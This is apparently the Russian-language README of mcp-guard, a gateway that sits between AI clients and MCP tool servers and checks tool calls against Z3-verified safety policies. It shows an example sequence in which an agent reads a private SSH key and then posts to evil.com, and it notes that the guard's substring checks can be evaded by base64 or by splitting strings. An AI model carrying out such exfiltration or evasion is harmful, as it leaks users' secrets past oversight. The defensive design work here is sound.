# mcp-guard

MCP-гейтвей: один stdio-сервер перед несколькими апстрим MCP-серверами.

```
Claude / Cursor / любой MCP Client
              │  stdio
              ▼
       ┌─────────────────┐
       │   mcp-gateway   │
       │  tools/list     │
       │  tools/call     │
       │      ▼          │
       │  policy/check   │
       └──────┬──────────┘
       ┌──────┼──────────┐
       ▼      ▼          ▼
     MCP A  MCP B      MCP C
```

## Запуск

Два локальных YAML — список серверов и политика. Аргументов не нужно:

```bash
cp examples/mcp-guard.yaml        mcp-guard.yaml          # серверы
cp examples/mcp-guard-policy.yaml mcp-guard-policy.yaml   # ограничения
uv run mcp-guard
```

Порядок поиска, для каждого файла свой: `$MCP_GUARD_CONFIG` → `./mcp-guard.yaml`/`.yml` →
`~/.config/mcp-guard/mcp-guard.yaml`/`.yml`, и `$MCP_GUARD_POLICY` → `./mcp-guard-policy.yaml`/`.yml` →
`~/.config/mcp-guard/mcp-guard-policy.yaml`/`.yml`. Явно — `--config PATH` и `--policy PATH`.
Без файла политики гейтвей форвардит всё и предупреждает об этом в лог.

В конфиге MCP-клиента:

```json
{
  "mcpServers": {
    "guard": {
      "command": "uv",
      "args": ["run", "--directory", "/path/to/mcp-guard", "mcp-guard"],
      "env": {
        "MCP_GUARD_CONFIG": "/path/to/mcp-guard.yaml",
        "MCP_GUARD_POLICY": "/path/to/mcp-guard-policy.yaml"
      }
    }
  }
}
```

## Конфиг

```yaml
servers:
  # без аутентификации — короткая форма
  public: https://public.example.com/mcp

  # bearer-токен из переменной окружения -> Authorization: Bearer <token>
  internal:
    url: https://internal.example.com/mcp
    token_env: INTERNAL_MCP_TOKEN

  # произвольные заголовки; ${VAR} подставляется из окружения
  github:
    url: https://api.example.com/mcp
    headers:
      Authorization: Bearer ${GITHUB_MCP_TOKEN}

  search:
    url: https://search.example.com/mcp
    headers:
      X-Api-Key: ${SEARCH_MCP_KEY}
```

Ключ под `servers` — это префикс имён тулов: `github` + `create_issue` уходит клиенту
как `github__create_issue`. `tools/call` разбирается обратно в `(апстрим, исходное имя)`
и форвардится владельцу.

Полный пример с комментариями — [examples/mcp-guard.yaml](examples/mcp-guard.yaml).

### Аутентификация

Поля на сервер, в порядке приоритета:

| Поле | Что делает |
| --- | --- |
| `headers` | Отправляются как есть. Свой `Authorization` здесь отключает всё ниже. |
| `token` | Литеральный токен → `Authorization: Bearer <token>`. |
| `token_env` | Имя переменной окружения с токеном. Пустая/несуществующая → ошибка старта. |
| — | Фоллбэк: `MCP_GUARD_TOKEN_<NAME>` (`MCP_GUARD_TOKEN_GITHUB` для `github`), если задана. |

`${VAR}` работает в любой строке конфига, так что секреты можно не хранить в файле.
Значения заголовков никогда не пишутся в логи — только их имена. Токены резолвятся при
старте, поэтому опечатка в `token_env` — это внятная ошибка конфига (`exit 2`), а не
падение соединения потом. `mcp-guard.yaml` в `.gitignore`.

OAuth (динамические токены с refresh) конфигом не покрыт: под него в `UpstreamAuth`
есть поле `httpx_auth` — туда кладётся `mcp.client.auth.OAuthClientProvider` при
программном использовании.

## Политика: формальная верификация вызовов

Отдельный файл `mcp-guard-policy.yaml`. Реализует **ePCA** (Executable Proof-Constrained
Action) из [Wu et al., *Provably Secure Agent Guardrail*](https://arxiv.org/abs/2605.29251):
допуск действия решается не суждением модели, а выполнимостью формулы в SMT-солвере.

Гейтвей — ровно та точка полного посредничества, которую статья постулирует: каждый
вызов сериализуется в типизированный payload, детерминированно транслируется в
first-order logic и проверяется Z3 против аксиом, написанных человеком. Модель в
контуре решения не участвует.

```
tools/call ──▶ 1. схема      аргументы против объявленных типов; не типизируется → deny
               2. ⟦j⟧_SMT    YAML-выражения → термы Z3 (whitelist AST, без eval)
               3. солвер     C = s ∧ ⟦j⟧_SMT ∧ Φ_safe(s')
               4. гейт       SAT → форвард + коммит δ(s,a)
                             UNSAT → блок, состояние не двигается
```

Ключевое: инварианты проверяются на **индуцированном** состоянии `s'`, а само состояние
живёт между вызовами. Поэтому ловятся атаки, разбитые на безобидные по отдельности шаги:

```
fs__read_file  {"path": "/home/u/README.md"}        ALLOW
http__post     {"url": "https://api.example.com"}   ALLOW   ← до taint исходящий разрешён
fs__read_file  {"path": "/home/u/.ssh/id_rsa"}      ALLOW   ← но ставит tainted=true
http__post     {"url": "https://evil.com"}          DENY    ← fails guard 'outbound_request'
```

Запрещена не любая из операций, а их последовательность — этого stateless-проверка не видит.

### Из чего состоит файл

| Секция | Смысл в терминах статьи |
| --- | --- |
| `state` | `S_ver` и начальное состояние `s₀` — security-релевантная проекция мира: `tainted`, счётчики |
| `invariants` | `Φ_safe` — должны выполняться в каждом достижимом состоянии |
| `actions` | `A` и `δ`: `match` (glob по имени тула), `requires` (охрана), `effect` (переход) |
| `patterns` | именованные списки подстрок для `matches()` |
| `default` | `allow` или `deny` для тулов без аксиом |

Грамматика выражений: литералы, арифметика, сравнения (в т.ч. цепочки), `and/or/not`,
и функции `implies`, `ite`, `startswith`, `endswith`, `contains`, `matches`, `member`.
Парсится парсером Python и переводится в Z3 через whitelist AST-узлов — **`eval` не
используется**, всё вне грамматики падает при старте:

```
policy p.yaml, invariant 'i': unknown function '<expression>'; available: implies, ite, ...
policy p.yaml, invariant 'i': unknown name 'y'; in scope: x
policy p.yaml, action 'a': effect on 'x' must produce int, got Bool from 'true'
```

В области видимости `requires`/`effect` — переменные состояния, объявленные в `args`
аргументы, и всегда `payload` (аргументы вызова как JSON), `tool`, `upstream`. `payload`
позволяет писать правила, не зная сигнатур чужих тулов:

```yaml
actions:
  - name: read_files
    match: ["*__read*", "*__cat", "*__glob"]
    effect:
      tainted: tainted or matches(payload, secret_paths)

  - name: outbound_request
    match: ["*__post", "http__*"]
    requires: implies(tainted, matches(payload, internal_hosts))
```

Инварианты пишутся только над состоянием — `payload` там намеренно вне области
видимости: `Φ_safe` это свойство состояния, а не отдельного вызова.

Полный пример — [examples/mcp-guard-policy.yaml](examples/mcp-guard-policy.yaml):
чтение `.ssh`/`.env`/`.pem`, чувствительные таблицы БД, запрет исходящих и мессенджеров
после такого чтения, запрет перезаписи секретных путей, бюджеты на число чтений.

### Отказ

Причина берётся из **unsat-core** Z3, поэтому называет конкретную нарушенную аксиому,
а не «denied»:

```
mcp-guard blocked 'fs__post': fails guard 'outbound_request'
  [state: tainted=True, secret_reads=1, external_calls=1]
mcp-guard blocked 'fs__read_file': violates invariant 'secret_read_budget' (secret_reads <= 5)
  [state: tainted=True, secret_reads=5, external_calls=0]
```

Отказ приходит клиенту как `CallToolResult` с `is_error=True`, а не исключением, — модель
видит причину и может среагировать.

### Границы гарантии

Честно о том, что доказано, а что предполагается — в статье это Assumptions 1–2:

- Гарантия условная: она держится **при условии**, что аксиомы описывают то, что вы
  имели в виду, и что абстракция состояния не потеряла существенное. Солвер проверяет
  соответствие вызова аксиомам, а не то, что аксиомы правильные.
- `matches()` работает по подстрокам JSON-payload'а. Это устойчиво к незнанию чужих
  сигнатур, но обходится кодированием (base64, склейка из кусков). Против такого нужны
  аксиомы на конкретные аргументы через `args`.
- Состояние живёт в памяти процесса и сбрасывается при рестарте гейтвея.
- Переход δ коммитится на SAT, **до** вызова апстрима: если апстрим упал или потерял
  ответ, действие всё равно засчитано. Сбой не должен снимать taint.
- Латентность решения ~3.5 мс (в статье 0.44 мс — там формула без строковой теории).
  На фоне 12–130 мс до апстрима это шум, но это не ноль.

## Устройство

| Файл | Что внутри |
| --- | --- |
| [mcp_guard/gateway.py](mcp_guard/gateway.py) | `MCPGateway` — держит апстримы, их клиентов и тулы; `list_tools()`, `resolve()`, `call_tool()` |
| [mcp_guard/policy.py](mcp_guard/policy.py) | интерфейс `Policy.check_tool_call()` и базовая политика, пускающая всё |
| [mcp_guard/epca/expr.py](mcp_guard/epca/expr.py) | грамматика выражений → термы Z3 |
| [mcp_guard/epca/spec.py](mcp_guard/epca/spec.py) | `Σ = ⟨S_ver, A, δ, s₀, Φ_safe⟩` из YAML, компиляция при старте |
| [mcp_guard/epca/monitor.py](mcp_guard/epca/monitor.py) | reference monitor: формула, решение, коммит перехода |
| [mcp_guard/epca/policy.py](mcp_guard/epca/policy.py) | `EPCAPolicy` — монитор за интерфейсом `Policy` |
| [mcp_guard/auth.py](mcp_guard/auth.py) | `UpstreamAuth` — резолв кредов в HTTP-заголовки |
| [mcp_guard/config.py](mcp_guard/config.py) | чтение и валидация обоих YAML |
| [mcp_guard/server.py](mcp_guard/server.py) | lowlevel MCP-сервер поверх stdio, хендлеры проксируют в гейтвей |
| [mcp_guard/cli.py](mcp_guard/cli.py) | точка входа |

Использование напрямую, без stdio-сервера:

```python
from mcp_guard import EPCAPolicy, MCPGateway, load_policy_spec, load_upstreams

gateway = MCPGateway(
    load_upstreams("mcp-guard.yaml"),
    policy=EPCAPolicy(load_policy_spec("mcp-guard-policy.yaml")),
)
async with gateway:
    result = await gateway.call_tool("github__search", {"q": "hi"})
```

Своя политика вместо ePCA — любой подкласс `Policy` в `MCPGateway(..., policy=...)`.
`check_tool_call` синхронная: под одним event loop гейтвея проверка и коммит состояния
не могут переслоиться с другим вызовом.

Логи идут в stderr: stdout занят транспортом.

## Что не сделано

- OAuth-флоу в конфиге — только статические креды (см. выше).
- Персистентность состояния верификатора между рестартами.
- Проксирование ресурсов и промптов — только тулы.
- `notifications/tools/list_changed` от апстримов: список тулов читается один раз при
  подключении, обновление — вручную через `refresh_tools()`.
